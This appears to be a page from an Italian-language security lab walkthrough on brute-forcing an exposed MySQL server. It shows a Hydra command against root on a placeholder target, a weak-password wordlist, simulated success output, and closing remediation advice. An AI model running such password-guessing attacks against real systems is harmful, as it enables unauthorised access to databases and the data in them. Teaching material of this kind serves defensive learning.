🔨 Fase 2: Brute Force

Quando la porta è chiusa, si prova ogni chiave
🧠 Il Ragionamento dell'Attaccante
"Ho trovato MySQL esposto sulla porta 3302. L'utente è quasi certamente 'root'. Se la password è debole, posso indovinarla provando migliaia di combinazioni al secondo."

Hydra è uno dei più potenti strumenti di brute-force. Supporta oltre 50 protocolli, incluso MySQL.
⚡ L'Attacco
hydra -l root \ -P weak_passlist.txt \ mysql://<TARGET_IP>:3302
-l root: Username da attaccare
-P weak_passlist.txt: Wordlist di password
mysql://: Protocollo target

Con una wordlist di 1000 password, l'attacco dura pochi secondi!
📋 La Wordlist
Le wordlist contengono password comuni e precedentemente leakate:
password 123456 rootpassword ← MATCH! admin letmein qwerty ...
Alternativa: rockyou.txt contiene 14 milioni di password reali da data breach.
🎯 Risultato dell'Attacco
[3302][mysql] host: 192.168.1.100 login: root password: rootpassword 1 of 1 target successfully completed, 1 valid password found
⚠️ Vulnerabilità sfruttata: Password debole + mancanza di rate limiting + MySQL esposto = accesso completo al database in pochi secondi.

Remediation: Password complesse (16+ caratteri), fail2ban, MySQL accessibile solo da localhost.
